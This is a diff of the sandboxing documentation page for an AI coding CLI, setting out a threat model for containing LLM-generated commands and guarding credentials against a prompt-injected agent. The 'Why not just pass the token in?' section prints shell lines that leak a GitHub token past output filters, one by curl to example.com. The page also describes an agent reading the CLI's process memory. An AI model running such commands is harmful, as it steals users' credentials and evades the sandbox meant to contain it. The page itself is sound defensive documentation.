@@ -55,7 +55,10 @@
           <li><a href="/llxprt-code/docs/tools/mcp-server.html">MCP Server Integration</a></li>
           <li><a href="/llxprt-code/docs/cli/themes.html">Themes</a></li>
           <li><a href="/llxprt-code/docs/tools/mcp-server.html">MCP servers</a></li>
+          <li><a href="/llxprt-code/docs/agent-api.html">Agent API</a></li>
+          <li><a href="/llxprt-code/docs/memory-profiling.html">Memory Profiling</a></li>
           <li><a href="/llxprt-code/docs/reference/application-directories.html">Application Directories</a></li>
+          <li><a href="/llxprt-code/docs/token-usage-log.html">Token Usage Log</a></li>
           <li><a href="/llxprt-code/docs/reference/ephemerals.html">Ephemeral Settings Reference</a></li>
           <li><a href="/llxprt-code/docs/reference/profiles.html">Profile File Reference</a></li>
           <li><a href="/llxprt-code/docs/cli/commands.html">Commands</a></li>
@@ -70,9 +73,16 @@
         <div class="docs-content">
           <div class="blog-post-content">
             <h1>Sandboxing</h1>
-<p>You should use sandboxing. LLMs leak PATs and other secrets into shell commands, write files outside your working directory, and love launching dozens of parallel test runs that black-screen your machine. Sandboxing makes all of this nearly impossible.</p>
+<p>Sandboxing runs LLxprt Code's tool execution inside an isolated boundary so
+that commands an LLM generates cannot freely read or modify the rest of your
+system. This page covers what the sandbox protects against, what it does <strong>not</strong>
+protect against, the per-engine boundaries, and how to verify the boundary is
+where you expect.</p>
+<p>For a step-by-step walkthrough, see the
+<a href="./tutorials/sandbox-setup.html">Sandbox Setup Tutorial</a>. For the full profile
+reference, see <a href="./cli/sandbox-profiles.html">Sandbox Profiles</a>.</p>
 <h2>Quick Start</h2>
-<pre><code class="language-bash"># Sandbox with automatic engine detection (Docker &gt; Podman &gt; Seatbelt)
+<pre><code class="language-bash"># Sandbox with automatic engine detection
 llxprt --sandbox &quot;fix the tests&quot;
 
 # Load a sandbox profile with resource limits
@@ -81,70 +91,857 @@ llxprt --sandbox-profile-load dev &quot;refactor this module&quot;
 # Explicitly pick an engine
 llxprt --sandbox-engine podman &quot;review this code&quot;
 </code></pre>
-<h2>What Sandboxing Does</h2>
-<p>Container sandboxing (Docker or Podman) runs LLxprt's tool execution inside an isolated container. This gives you:</p>
+<blockquote>
+<p><strong>Which engine should I use?</strong> Prefer <strong>Docker</strong> or <strong>Podman</strong>. They run tool
+execution inside an isolated Linux container with a separate process
+namespace, enforced resource limits, and credential isolation. Seatbelt
+(macOS <code>sandbox-exec</code>) is a much weaker fallback — it has no process
+isolation, no resource limits, and no credential isolation — so use it only
+when containers are unavailable. See <a href="#choosing-an-engine">Choosing an engine</a>.</p>
+</blockquote>
+<h2>Threat model</h2>
+<p><strong>What sandboxing is intended to protect against:</strong></p>
 <ul>
-<li><strong>File isolation</strong> — the LLM can only touch your project directory (mounted read-write) and temp files. It can't access <code>~/.ssh</code>, <code>~/.aws</code>, other repos, or anything else on your system.</li>
-<li><strong>Credential isolation</strong> — API keys, refresh tokens, and keyring data stay on the host. The container gets short-lived access tokens via a credential proxy over a Unix socket. The LLM never sees your stored secrets.</li>
-<li><strong>Resource limits</strong> — cap CPU, memory, and process count. No more black-screened laptops from <code>vitest --run</code> spawning 200 workers.</li>
-<li><strong>Network control</strong> — disable networking entirely for untrusted code, or leave it on for normal development.</li>
-<li><strong>SSH agent forwarding</strong> — git push/pull still works inside the sandbox via agent forwarding (no private keys copied in).</li>
+<li>Accidental or unintended writes outside your project directory and temp
+directory (for example, an LLM-generated <code>rm -rf</code> or a test runner writing
+to your home directory).</li>
+<li>Unbounded resource consumption — a process spawning hundreds of workers or
+exhausting memory can be capped via profile resource limits
+(<code>cpus</code>, <code>memory</code>, <code>pids</code>).</li>
+<li>Exposure of the OS keyring and system token store to tool execution. In
+container mode (Docker or Podman), the OS keyring is not accessible from
+inside the container. <code>GEMINI_API_KEY</code> and <code>GOOGLE_API_KEY</code> are no longer
+forwarded as container environment variables, and the <code>~/.config/gcloud</code>
+directory and the <code>GOOGLE_APPLICATION_CREDENTIALS</code> file are no longer mounted
+(and that variable is no longer set inside the container). The Gemini provider
+itself still works: keys saved on the host with <code>/key save</code> are resolved
+inside the container through the
+<a href="#credential-proxy-container-mode-only">credential proxy</a>, either via
+<code>/key load &lt;name&gt;</code> or a profile <code>auth-key-name</code>. Note that Vertex AI, application
+default credentials (ADC), and service-account authentication do <strong>not</strong> work
+from inside a container sandbox (see
+<a href="#credential-handling-in-containers">Credential handling in containers</a>). The
+LLxprt global configuration directory is still mounted into the container, so
+a profile containing an inline <code>auth-key</code>, or a global <code>.env</code>, remains
+readable from inside it (see issue
+<a href="https://github.com/vybestack/llxprt-code/issues/2957">#2957</a>); prefer
+<code>/key save</code> over inline profile keys.</li>
 </ul>
-<h2>Choosing an Engine</h2>
+<p><strong>What sandboxing is NOT intended to protect against:</strong></p>
+<ul>
+<li>A malicious, determined adversary who targets your specific machine.</li>
+<li>Data already inside the project directory. The project directory is mounted
+read-write and is fully accessible to tool execution by design.</li>
+<li>Credentials and configuration that are intentionally forwarded into the
+sandbox to support development workflows (the credential proxy, SSH agent
+forwarding, git config passthrough, and paths you explicitly mount) — see
+<a href="#intentional-boundary-crossings">Intentional boundary crossings</a>. These are
+opt-in or design choices.</li>
+<li>Network exfiltration of data that networking is left enabled for. If
+<code>network</code> is <code>on</code>, outbound network access is available to tool execution.</li>
+<li>Reading the sandboxed CLI process's own memory. The credential never enters
+the sandbox's filesystem, environment, or argv, but it does enter the sandbox
+CLI process's address space whenever a provider call is made. In container
+mode (Docker/Podman) the CLI marks itself non-dumpable (<code>prctl PR_SET_DUMPABLE 0</code>) on startup, so an in-container process running as the same
+UID <strong>cannot</strong> read <code>/proc/&lt;pid&gt;/mem</code> — regardless of the host kernel's Yama
+<code>ptrace_scope</code>. See
+<a href="#credential-residency-and-process-memory">Credential residency and process memory</a>.</li>
+</ul>
+<p>The sandbox raises the bar for accidental damage and limits the blast radius of
+LLM-generated commands. It is a containment control, not a full security
+isolation boundary.</p>
+<h2>Credential residency and process memory</h2>
+<p>The credential proxy keeps your stored secrets on the host. To be precise about
+what that does and does not guarantee:</p>
+<p><strong>Where the credential does not go:</strong></p>
+<ul>
+<li>It is never written to the container's filesystem.</li>
+<li>It is never placed in the container's environment or argv.</li>
+<li>It is only returned over the proxy socket to a caller that presents the
+per-session capability token; it is not broadcast or forwarded to arbitrary
+network peers.</li>
+</ul>
+<p><strong>Where the credential does go:</strong> the sandbox CLI process's own address space,
+whenever it must make a provider call. Resolving a named key through the proxy
+returns the raw key into that same address space so the CLI can authenticate.
+This is unavoidable: the CLI needs the credential to call the provider.</p>
+<p><strong>The consequence.</strong> Anything that can read the CLI process's memory can read
+both the capability token and the credential. The agent's shell commands are
+<strong>descendants</strong> of the token-holding CLI process, so an attack vector is for a
+descendant to read an ancestor's memory via <code>/proc/&lt;pid&gt;/mem</code>.</p>
+<p><strong>In container mode this is blocked unconditionally.</strong> The CLI process calls
+<code>prctl(PR_SET_DUMPABLE, 0)</code> at startup (before the CLI module is imported),
+which makes <code>/proc/&lt;pid&gt;/{maps,mem,...}</code> root-owned, so the kernel's
+<code>ptrace_may_access</code> check denies a same-UID in-container reader with <code>EACCES</code> —
+the read is refused at <code>maps</code>, before <code>mem</code> is ever reached. This holds
+<strong>regardless of the host kernel's Yama <code>ptrace_scope</code></strong>: it holds at
+<code>ptrace_scope == 0</code> and on Docker Desktop for macOS, whose VM kernel reports no
+<code>ptrace_scope</code> at all — precisely the environments where the read used to
+succeed.</p>
+<p>This control composes with the privilege hardening shipped in
+<a href="https://github.com/vybestack/llxprt-code/pull/3022">#3022</a>: every container run
+drops <code>--cap-drop=ALL</code> (removing <code>CAP_SYS_PTRACE</code>) and sets
+<code>--security-opt no-new-privileges</code>. <code>PR_SET_DUMPABLE(0)</code> alone denies an ordinary
+same-UID reader — it makes the proc files root-owned so <code>ptrace_may_access</code>
+returns false. <code>CAP_SYS_PTRACE</code> is a privileged override that bypasses the
+dumpable check, so the #3022 capability drop is what prevents that override.
+Dropping the capability alone does NOT deny the ordinary reader: a dumpable
+process is still readable by same-UID without any capability. The two controls
+compose — <code>PR_SET_DUMPABLE</code> denies the ordinary reader, and the capability drop
+denies the privileged override — and together they close the vector
+unconditionally and vector-agnostically: it does not matter whether the attacker
+reached code execution through the shell tool, an MCP server, a hook, an
+extension, or a malicious <code>npm postinstall</code> — the OS boundary denies the read,
+not an allowlist that has to stay exhaustive. It also covers the credential, not
+just the token: the provider API key resides in the same address space, so both
+are protected.</p>
+<p>This was confirmed empirically against real containers (see issues
+<a href="https://github.com/vybestack/llxprt-code/issues/2902">#2902</a> and
+<a href="https://github.com/vybestack/llxprt-code/issues/3028">#3028</a>): with
+<code>--cap-drop=ALL</code> + <code>no-new-privileges</code> but the process still dumpable, a
+descendant recovered the secret from the CLI's heap; adding
+<code>prctl(PR_SET_DUMPABLE, 0)</code> made the descendant's open of <code>/proc/&lt;pid&gt;/maps</code>
+fail with <code>EACCES</code>. The behavioral test in
+<code>integration-tests/sandboxPrivilege.real.test.ts</code> reproduces this in a real
+container and fails if the <code>prctl</code> call is removed.</p>
+<p>The capability token remains a meaningful secret in its own right: it persists
+for the session and can fetch a credential from the proxy at a time when no
+credential is yet resident in memory. Once a credential is resident, however,
+both live in the same address space.</p>
+<p><strong>Surviving non-goal — in-process attackers.</strong> Code executing <strong>inside</strong> the CLI
+process itself — a malicious dependency, a compromised in-process extension, or
+any other code sharing the CLI's address space — can still read the token and
+the credential directly from its own heap. <code>PR_SET_DUMPABLE</code> is an OS boundary
+against <em>other</em> processes; it cannot defend against code running <em>within</em> this
+one. This is the same non-goal it has always been (see issue
+<a href="https://github.com/vybestack/llxprt-code/issues/1954">#1954</a>).</p>
+<p><strong>Trade-offs.</strong> Marking the CLI non-dumpable disables core dumps for the CLI
+process and prevents external ptrace-attach debugging of the CLI inside the
+container. (<code>--inspect</code> is socket-based and unaffected.) It is applied on Linux
+when the process is running inside a container sandbox (<code>SANDBOX</code> set to a
+non-<code>sandbox-exec</code> value) <strong>or</strong> when it is credential-bearing
+(<code>LLXPRT_CAPABILITY_FD</code> or <code>LLXPRT_CREDENTIAL_SOCKET</code> is set); the Seatbelt
+(macOS-host) path is unchanged. On a user-supplied non-glibc sandbox image,
+<code>prctl</code> cannot be resolved from libc; in that case:</p>
+<ul>
+<li>If the process is <strong>credential-bearing</strong>, the CLI <strong>fails closed</strong> — it prints
+a fatal error and refuses to start, because it cannot protect the credential
+in memory. Use the official Debian bookworm / glibc sandbox image.</li>
+<li>If the process is <strong>not credential-bearing</strong> (e.g. a tokenless custom image),
+the CLI writes a visible warning to stderr and continues, and the in-container
+memory read is not blocked.</li>
+</ul>
+<p>The sandbox therefore defends against a prompt-injected agent that reads files,
+inspects the environment, scans argv, speaks the proxy protocol, or — in
+container mode — attempts to read the CLI process's memory from another
+in-container process.</p>
+<h2>Using GitHub from a Sandbox</h2>
+<blockquote>
+<p><strong>Applies to Docker and Podman.</strong> Seatbelt has no credential isolation — it
+runs on the host with your full keyring — so nothing below describes a
+boundary under Seatbelt. Use a container engine if this matters to you.</p>
+</blockquote>
+<p>With Docker or Podman, no GitHub credential is placed in the container, so <code>gh</code>
+inside the sandbox is not authenticated. Use the
+<a href="./tools/github.html"><code>github</code> tool</a> instead: the model names an operation, the
+host runs <code>gh</code>, and shaped results come back. The credential stays on the host.</p>
+<p>This covers issues, pull requests, reviews, checks and labels, including
+blocking on CI with <code>pr.checks</code> and <code>watch: true</code>. The tool works the same way
+outside a sandbox, so there is no mode-specific behaviour to learn.</p>
+<h3>Why not just pass the token in?</h3>
+<p>An obvious alternative is to inject the token as an environment variable and
+strip it out of command output. That does not work, and it is worth recording
+why so it is not proposed again:</p>
+<pre><code class="language-bash">echo ${GH_TOKEN:0:20}; echo ${GH_TOKEN:20}   # neither half matches a filter
+echo $GH_TOKEN | base64                      # or rev, or md5
+curl -H &quot;Authorization: bearer $GH_TOKEN&quot; example.com   # never touches stdout
+</code></pre>
+<p>Networking is on by default, so the last one alone defeats output filtering.
+Once a secret is in the environment of a shell the model controls, the model
+has the secret. Filtering output is useful hygiene against accidental leakage
+in logs, but it is not a boundary.</p>
+<p>The tool takes the other approach: the agent gets a <strong>capability</strong> — the set of
+operations the host is willing to perform — rather than the credential itself.</p>
+<h3>What this does and does not protect</h3>
+<p>The sandbox exists to stop credential theft by a prompt-injected or over-eager
+agent. It does <strong>not</strong> try to prevent misuse of capabilities you deliberately
+granted: if the agent can comment on issues, it can post a bad comment. That is
+a consequence of granting the capability, which is why write operations ask for
+confirmation.</p>
+<h2>What is isolated, and what is not</h2>
+<p>The boundary differs by engine. The table summarizes what each engine isolates
+by default. Detailed limitations follow.</p>
+<table>
+<thead>
+<tr>
+<th>Boundary</th>
+<th>Docker / Podman (container)</th>
+<th>Seatbelt (macOS <code>sandbox-exec</code>)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Filesystem writes</td>
+<td>Restricted to mounted paths (project, temp)</td>
+<td>Restricted to allow-listed paths (project, temp, config)</td>
+</tr>
+<tr>
+<td>Filesystem reads</td>
+<td>Restricted to mounted paths</td>
+<td>Broader read access; writes are the primary restriction</td>
+</tr>
+<tr>
+<td>Network</td>
+<td>Configurable (<code>on</code> / <code>off</code> / <code>proxied</code>)</td>
+<td>Configurable; selects a matching built-in Seatbelt profile</td>
+</tr>
+<tr>
+<td>Resource limits</td>
+<td>Enforced (<code>cpus</code>, <code>memory</code>, <code>pids</code>)</td>
+<td>Not available</td>
+</tr>
+<tr>
+<td>Process isolation</td>
+<td>Separate container process namespace</td>
+<td>Runs directly on your host</td>
+</tr>
+<tr>
+<td>Stored secrets</td>
+<td>OS keyring not accessible; <code>GEMINI_API_KEY</code>/<code>GOOGLE_API_KEY</code> are not forwarded and gcloud/ADC files are not mounted. Gemini API keys resolve through the <a href="#credential-proxy-container-mode-only">credential proxy</a>. Vertex AI/ADC/service-account auth does not work. The LLxprt global config directory (holding profiles with inline <code>auth-key</code> and a global <code>.env</code>) is still mounted — see <a href="https://github.com/vybestack/llxprt-code/issues/2957">#2957</a></td>
+<td>Host keyring and token store are fully available</td>
+</tr>
+</tbody>
+</table>
+<h3>Filesystem</h3>
+<p>In container mode, these paths are always mounted into the container:</p>
+<ul>
+<li>Your project working directory (read-write)</li>
+<li>Every accepted workspace root supplied through <code>--include-directories</code>
+(read-write). Docker and Podman bind each root to the same path inside the
+container, using the same Windows-to-POSIX translation as the primary
+workspace. LLxprt resolves and checks every root before contacting the
+container engine. A missing path, a path that is not a readable, writable, and
+searchable directory, or roots that contain one another stop startup with an
+error that names the paths and suggests correcting <code>--include-directories</code>.</li>
+<li>The system temp directory (read-write)</li>
+<li>The LLxprt Code global <strong>configuration</strong> directory (read-write). This is your
+platform-standard config directory (the same one resolved by
+<code>Storage.getGlobalConfigDir()</code>, e.g. <code>~/.config/llxprt-code</code> on Linux or
+<code>~/Library/Preferences/llxprt-code</code> on macOS). It is mounted at the equivalent
+path inside the container (on Windows hosts the mount destination is the
+translated POSIX form, e.g. <code>C:\Users\me\...</code> becomes <code>/c/Users/me/...</code>), and
+<code>LLXPRT_CONFIG_HOME</code> is pinned to that destination so the in-container CLI
+reads your <code>settings.json</code>, profiles, subagents, prompts, commands, policies,
+hooks, global <code>LLXPRT.md</code>, <code>welcomeConfig.json</code>, <code>trustedFolders.json</code> and
+user <code>skills/</code>. This directory holds a global <code>.env</code> and profiles
+(<code>profiles/*.json</code>); a profile containing an inline <code>auth-key</code>, or that
+<code>.env</code>, is therefore readable from inside the container. Prefer <code>/key save</code>
+over inline profile keys — see issue
+<a href="https://github.com/vybestack/llxprt-code/issues/2957">#2957</a>.</li>
+<li>Git configuration files, mounted read-only (see
+<a href="#git-config-passthrough">Git config passthrough</a>)</li>
+</ul>
+<blockquote>
+<p><strong>What is <em>not</em> mounted:</strong> only the configuration directory crosses the
+boundary. The <strong>data</strong> directory (OAuth credentials, provider accounts,
+installation id, conversations, history, todos), the <strong>cache</strong> directory, and
+the <strong>log/state</strong> directory are <em>container-local and ephemeral</em>: they exist
+only for the lifetime of a sandboxed session and are discarded when the
+container exits. Anything written to them during a sandboxed session — including
+freshly minted credentials — is lost on exit. Their container paths are pinned
+with <code>LLXPRT_DATA_HOME</code>, <code>LLXPRT_CACHE_HOME</code> and <code>LLXPRT_LOG_HOME</code> from the
+container's <em>real</em> HOME inside the sandbox entrypoint (so they follow the
+sandbox image's default user home, including custom images), keeping them
+separate from the mounted config directory. This is why you may need to
+re-authenticate inside a sandbox: the credential proxy (<code>LLXPRT_CREDENTIAL_SOCKET</code>)
+is the supported way to reach host secrets without bind-mounting credential files.</p>
+</blockquote>
+<p>Additional paths are conditionally mounted based on your host environment and
+profile configuration:</p>
+<ul>
+<li>The SSH agent socket, if SSH agent forwarding is enabled — see
+<a href="#ssh-agent-forwarding">SSH agent forwarding</a>.</li>
+<li>Any paths you add via <code>LLXPRT_SANDBOX_MOUNTS</code> / <code>SANDBOX_MOUNTS</code> or a profile
+<code>mounts</code> array — see
+<a href="#custom-mounts-and-environment-variables">Custom mounts and environment variables</a>.</li>
+</ul>
+<p>Everything else on your host (<code>~/.ssh</code> private keys, <code>~/.aws</code>, other projects)
+is not accessible from inside the container unless you explicitly mount it.</p>
+<h4>Project <code>node_modules</code> are private per run (container mode)</h4>
+<p>The workspace binds keep source read-write with one exception: project
+<code>node_modules</code> directories do not cross the host/container platform boundary.
+At launch, LLxprt Code creates fresh engine-owned named volumes and mounts one
+over each of these locations in the primary workspace and every accepted
+<code>--include-directories</code> root:</p>
+<ul>
+<li><code>&lt;workspace-root&gt;/node_modules</code>; and</li>
+<li><code>node_modules</code> beneath each nested Node package root declared in that root's
+<code>package.json</code> <code>workspaces</code> list.</li>
+</ul>
+<p>Workspace declarations may use an array or an object with a <code>packages</code> array.
+Literal paths retain support for package roots that do not exist yet. Supported
+globs use <code>*</code> as a complete path segment, such as <code>packages/*</code>, or a final <code>**</code>
+after a literal directory prefix, such as <code>tools/**</code>. A leading <code>!</code> excludes
+matching package roots. Glob discovery selects directories that contain a
+<code>package.json</code>, ignores <code>node_modules</code> and <code>.git</code> trees, and rejects a matched
+package root whose resolved path leaves the real workspace. Each accepted root's
+<code>node_modules</code> is protected even without a manifest.</p>
+<p>A positive glob that matches no package roots stops the launch and suggests
+using a literal path for a package root that does not exist yet. Unsupported
+glob operators also stop the launch and report the accepted forms. An exclusion
+that matches nothing has no effect. These checks finish before Docker or Podman
+creates a volume or container.</p>
+<p>Each private volume is initialized for the user the container already runs as,
+even when that user's UID differs from the host user. This isolation applies
+to normal installed-mode sessions. A <code>NODE_ENV=development</code> source-entrypoint
+session keeps using the shared workspace binds unchanged.</p>
+<p>Inside a sandboxed session this means:</p>
+<ul>
+<li>The agent starts from the image-global <code>llxprt</code> install, so no host install
+is required before the agent can run the project's installer itself.</li>
+<li>Installer, build, and test output goes to the private per-run volumes, never
+to your host <code>node_modules</code>. Host-installed dependencies are hidden while the
+container runs, and container-installed dependencies are discarded with the
+session; a later session starts with fresh, empty storage.</li>
+<li>Source outside <code>node_modules</code> stays shared: edits made inside the sandbox are
+immediately visible on the host, and host edits are visible inside.</li>
+</ul>
+<p>Normal exit, handled interruption, preparation failure, and launch failure
+remove the per-run volumes; the selected container engine owns them. A
+protected path that was absent before the session is absent again afterward:
+LLxprt removes an empty mountpoint materialized through a workspace bind, but
+never removes a nonempty directory. Cleanup failures print a warning naming
+the operation and the engine resource or host path. Docker and Podman startup
+also recover storage left by <code>SIGKILL</code>, OOM termination, LLxprt failure, host
+restart, or power loss. Recovery runs after all filesystem planning and
+preflight have succeeded. It first removes managed containers whose
+process-instance owner is provably dead. It then considers only managed
+volumes whose name starts with <code>sandbox-node-modules-</code>, whose process-instance
+owner is provably dead, and whose dependency run ID is not present on a
+running managed container. Volume removal is not forced, so an existing or
+newly appearing attachment causes the engine to retain the volume. Unknown
+ownership, foreign-host ownership, active owners, malformed labels, anonymous
+volumes, custom volumes, and persistent checkpoint storage are retained.</p>
+<p>A recovery failure prints the engine operation and resource name. To inspect a
+reported volume, use the selected engine, its exact name from the warning, and
+these label-scoped commands:</p>
+<pre><code class="language-bash">docker volume ls --filter label=com.vybestack.llxprt.sandbox-managed=true
+docker volume inspect VOLUME_NAME
+docker volume rm VOLUME_NAME
+</code></pre>
+<p>Replace <code>docker</code> with <code>podman</code> for rootless Podman. Check the owner and
+<code>com.vybestack.llxprt.sandbox-dependency-run</code> labels before manual removal. Do
+not use a broad volume prune or container removal with <code>--volumes</code>.</p>
+<p>Before creating the private mounts, a read-only preflight scans the existing
+host <code>node_modules</code> trees (the whole protected trees, so nothing is missed) for
+recognized wrong-platform binaries and stops the launch with repair guidance
+when it finds one (see <a href="#troubleshooting">Troubleshooting</a>). Each file it
+inspects is read only far enough to classify its header. The preflight covers
+<code>.node</code> native addons and entries reached through protected <code>.bin</code> directories
+(regular executables directly in <code>.bin</code> and symlinked <code>.node</code> files, whose
+contained targets are read but never executed, included) and recognizes ELF,
+Mach-O (including universal/fat binaries), and PE headers, including PE files
+whose header offset lies deeper in the file than the first probe.</p>
+<h4>Persistent checkpoint storage (container mode)</h4>
+<p>With <code>--checkpointing</code> enabled, one additional engine-owned named volume backs
+the session: <code>sandbox-checkpoints-&lt;project_hash&gt;</code>, carrying the labels
+<code>com.vybestack.llxprt.sandbox-managed=true</code>,
+<code>com.vybestack.llxprt.sandbox-checkpoint-store=&lt;project_hash&gt;</code>, and
+<code>com.vybestack.llxprt.sandbox-checkpoint-persistent=true</code>. A bounded uid-0
+init container prepares it before the main container starts, and the trusted
+entrypoint links the shadow git history and the <code>/restore</code> checkpoint metadata
+into it, so checkpoint state survives the <code>--rm</code> container and later sandbox
+sessions of the same project restore from the same history (see
+<a href="./checkpointing.html">Checkpointing</a>).</p>
+<p>This volume is deliberately <strong>not</strong> part of the per-run dependency storage
+lifecycle. Dependency volumes are created and released with each run and may
+be reclaimed by stale-run cleanup; the checkpoint store is persistent project
+state. The distinction is enforced by naming and labels: the store never
+carries the per-run dependency label or process owner labels, and run-scoped
+reclamation matches only those, so it can never delete checkpoint history.
+Session cleanup, launch failure, and crash recovery all leave the checkpoint
+store in place; remove it manually with <code>docker volume rm</code> / <code>podman volume rm</code> when you no longer want it.</p>
+<p>If the engine cannot create or initialize the store, or the store is missing
+at entry (for example an older launcher with a newer image), the session fails
+before checkpointing is presented as available.</p>
+<p>Seatbelt keeps its existing profile-based behavior. Its built-in profiles expose
+up to five accepted <code>--include-directories</code> roots through the existing
+<code>INCLUDE_DIR_0</code> through <code>INCLUDE_DIR_4</code> parameters and add those paths to the
+write allow-list. The container-only overlap preflight and private dependency
+volumes do not apply because Seatbelt runs directly on the host. Seatbelt also
+grants broader read access, including a read-only grant for the legacy global
+directory that startup migration reads from. See
+<a href="./reference/application-directories.html">Application Directories</a>.</p>
+<h3>Network</h3>
+<p>Network access is controlled by the profile <code>network</code> setting, which takes
+<code>on</code>, <code>off</code>, or <code>proxied</code>. Both container mode and Seatbelt honour it, by
+different mechanisms.</p>
+<p>In container mode:</p>
+<ul>
+<li><code>on</code> (default for the <code>dev</code> profile) — outbound network is available.</li>
+<li><code>off</code> — the container is started with <code>--network none</code>.</li>
+<li><code>proxied</code> — container traffic is routed through a proxy you supply. This
+requires <code>LLXPRT_SANDBOX_PROXY_COMMAND</code> to be set to a non-empty value.
+If it is missing or blank, LLxprt Code <strong>fails before the container starts</strong>
+rather than falling back to open networking.</li>
+</ul>
+<p>Under Seatbelt, the setting selects a built-in macOS profile: <code>off</code> uses
+<code>permissive-closed</code>, <code>proxied</code> uses <code>permissive-proxied</code>, and <code>on</code> (or an unset
+value) uses <code>permissive-open</code>. The proxied profiles also require
+<code>LLXPRT_SANDBOX_PROXY_COMMAND</code>, and fail without it.</p>
+<blockquote>
+<p><strong>Note:</strong> Setting <code>SEATBELT_PROFILE</code> explicitly overrides this selection and
+is an advanced escape hatch. Custom profile names keep their own lookup
+behavior.</p>
+</blockquote>
+<blockquote>
+<p><strong>Warning:</strong> On macOS, the Docker and Podman credential bridge needs container
+networking, so <code>network: off</code> in container mode fails before the proxy or
+container starts. Use <code>on</code>, or run on Linux, when you need network-off
+containers with credential isolation.</p>
+</blockquote>
+<h3>Resource limits</h3>
+<p>Container mode enforces resource limits via the profile <code>resources</code> fields:</p>
+<ul>
+<li><code>cpus</code> — CPU core limit (<code>--cpus</code>)</li>
+<li><code>memory</code> — memory limit (<code>--memory</code>)</li>
+<li><code>pids</code> — maximum process count (<code>--pids-limit</code>)</li>
+</ul>
+<p>Seatbelt does not support resource limits. A runaway process under Seatbelt can
+consume your machine's resources.</p>
+<h3>Process</h3>
+<p>Container mode runs in a separate process namespace. Seatbelt runs directly on
+your host with macOS kernel restrictions applied via <code>sandbox-exec</code>.</p>
+<h3>Privilege hardening (container mode)</h3>
+<p>Every Docker and Podman sandbox run is started with two privilege-hardening
+flags by default:</p>
+<ul>
+<li><strong><code>--cap-drop=ALL</code></strong> — drops every Linux capability, so the sandboxed process
+starts with an empty capability set. It cannot perform privileged operations
+such as <code>mount</code>, changing network configuration, or overriding file
+permissions. (Whether binding to privileged ports requires a capability is
+kernel/sysctl dependent: modern Docker sets
+<code>net.ipv4.ip_unprivileged_port_start=0</code> in containers, so a non-root process
+can bind low ports even with no capabilities. <code>--publish</code> port forwarding is
+handled by the runtime and is unaffected.)</li>
+<li><strong><code>--security-opt no-new-privileges</code></strong> — forbids the process from gaining new
+privileges. Setuid-root binaries the image ships (such as <code>su</code>, <code>mount</code>, and
+<code>passwd</code>) execute <strong>without</strong> their setuid effect, so an agent command cannot
+escalate to root through them. This was verified against a real setuid-root
+binary inside the sandbox image: under these flags the effective uid stays the
+caller's, whereas without <code>no-new-privileges</code> it becomes 0.</li>
+</ul>
+<p>These defaults are applied <strong>before</strong> any <code>SANDBOX_FLAGS</code>, so <code>SANDBOX_FLAGS</code>
+can still extend or override them (see
+<a href="#extra-container-flags">Extra container flags</a>). Note that adding a capability
+back with <code>--cap-add</code> only widens the bounding set; whether the final process
+actually holds it depends on the runtime and path.</p>
+<h4>Current-user path capability add-backs</h4>
+<p>On Linux distributions where the container is mapped to your host UID/GID
+(Debian/Ubuntu by default, or any host with <code>SANDBOX_SET_UID_GID=true</code>), the
+sandbox starts as root, creates a matching user with <code>groupadd</code>/<code>useradd</code>, and
+then drops to your UID/GID via <code>su</code>. That setup needs a small, fixed set of
+capabilities, so exactly these three are added back on this path — and no others
+(proven by leave-one-out testing; <code>DAC_OVERRIDE</code> and <code>FOWNER</code> are not required):</p>
+<ul>
+<li><code>CHOWN</code> — <code>groupadd</code>/<code>useradd</code> write to <code>/etc/gshadow</code> and <code>/etc/shadow</code>.</li>
+<li><code>SETUID</code>, <code>SETGID</code> — create the matching UID/GID and let <code>su</code> drop to them.</li>
+</ul>
+<p><code>--security-opt no-new-privileges</code> does not interfere with this path: <code>su</code> is
+invoked by root (already uid 0), so no setuid escalation is required. The three
+capabilities are the verified minimum; removing any one of them makes
+<code>groupadd</code>/<code>useradd</code> fail to write the shadow files or <code>su</code> unable to
+authenticate.</p>
+<p>These capability flags do <strong>not</strong> change the memory-read boundary above: reading
+<code>/proc/&lt;pid&gt;/mem</code> of a same-UID process requires no capability.</p>
+<h2>Per-engine limitations</h2>
+<h3>Docker</h3>
+<p>Best tested and the default for most users. Auto-detected when <code>docker</code> is on
+your <code>PATH</code>. Resource limits, networking control, and the credential proxy are
+all supported.</p>
+<h3>Podman</h3>
+<p>Supported with full resource limits and credential proxy. On macOS, Podman runs
+containers inside a Linux VM, which introduces two platform-specific
+limitations:</p>
+<ol>
+<li><strong>SSH agent forwarding and credential proxy tunneling</strong> require <code>socat</code> in
+the container image and use an SSH reverse tunnel because the host socket
+cannot be mounted directly into the VM.</li>
+<li><strong>Memory</strong> has a hard ceiling set by the Podman machine VM, separate from the
+container memory limit. See
+<a href="#podman-macos-oom-killed-with-exit-code-137">Podman macOS: OOM-killed with exit code 137</a>.</li>
+</ol>
+<h3>Seatbelt (macOS <code>sandbox-exec</code>)</h3>
+<p>Seatbelt is a macOS-only fallback that uses Apple's <code>sandbox-exec</code> command. It
+runs directly on your host — there is no container and no separate process
+namespace. <strong>Prefer Docker or Podman for meaningful isolation.</strong> Seatbelt
+provides a substantially weaker boundary and should be used only when a
+container runtime is unavailable.</p>
+<p>Limitations:</p>
+<ul>
+<li><strong>No process isolation</strong> — the sandboxed process runs directly on your host
+in the normal process namespace, not inside a container.</li>
+<li><strong>No resource limits</strong> — CPU, memory, and process count cannot be capped. A
+runaway process can consume your machine's resources.</li>
+<li><strong>No credential isolation</strong> — the sandboxed process runs with your full host
+keyring and token store. The credential proxy is not used (the
+<code>LLXPRT_CREDENTIAL_SOCKET</code> variable is explicitly removed from the Seatbelt
+child environment), so tool execution has the same access to your stored
+secrets as any process you launch.</li>
+<li><strong>Write-path allow-lists only</strong> — Seatbelt restricts writes to an allow-list
+of paths but grants broad read access across your host.</li>
+<li><strong>Network rules come from the profile file</strong> — the <code>network</code> setting selects a
+built-in macOS profile (<code>permissive-closed</code>, <code>permissive-proxied</code>, or
+<code>permissive-open</code>) rather than isolating a network namespace. This is the one
+control Seatbelt does honour.</li>
+<li><strong><code>sandbox-exec</code> is undocumented</strong> — Apple has shipped <code>sandbox-exec</code> without
+public documentation for many releases and has informally deprecated it since
+macOS 10.15. Its profile format and future availability are not guaranteed.</li>
+</ul>
+<p>Seatbelt is auto-detected only on macOS when <code>sandbox-exec</code> is on your <code>PATH</code>.
+Use Docker or Podman when available.</p>
+<h2>Credential handling in containers</h2>
+<p>Earlier releases forwarded several long-lived Google credentials into the
+container as a known defect (tracked as
+<a href="https://github.com/vybestack/llxprt-code/issues/2946">issue #2946</a>). Those
